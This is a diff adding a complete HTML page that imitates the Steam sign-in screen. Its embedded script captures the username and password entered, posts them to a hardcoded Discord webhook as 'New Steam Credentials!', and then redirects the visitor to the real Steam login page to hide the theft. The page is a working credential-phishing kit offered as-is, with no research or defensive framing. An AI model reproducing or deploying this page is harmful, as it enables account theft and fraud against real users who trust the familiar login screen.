@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam Sign In</title>
+    <style>
+        body {
+            background-color: #171a21;
+            color: #c6d4df;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #1b2838;
+            padding: 30px;
+            border-radius: 5px;
+            width: 350px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        h2 {
+            text-align: center;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 93%;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #32353b;
+            border: 1px solid #000;
+            color: #fff;
+            border-radius: 3px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #66c0f4;
+            color: #171a21;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #4fa8d6;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #66c0f4;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Steam Sign In</h2>
+        <form id="loginForm" action="https://steamcommunity.com/login/datapower/" method="POST">
+            <input type="text" id="username" name="username" placeholder="Username or email address" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit" id="btn">Sign in</button>
+            <div class="loading" id="loader">
+                <div class="spinner"></div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1570962633216098324/R8dOwb_aVDKqpFIguw9swkfp29FtqITKYjweN37k9AocBtrpvDpM7BLufJbhcwfYZqSf";
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('btn');
+            const loader = document.getElementById('loader');
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔥 **New Steam Credentials!**\n\n**Username:** \`${username}\`\n**Password:** \`${password}\``
+                    })
+                });
+                
+                setTimeout(() => {
+                    window.location.href = "https://store.steampowered.com/login/";
+                }, 1500);
+            } catch (error) {
+                console.error('Error:', error);
+                alert("An error occurred.");
+            }
+        });
+    </script>
+</body>
+</html>
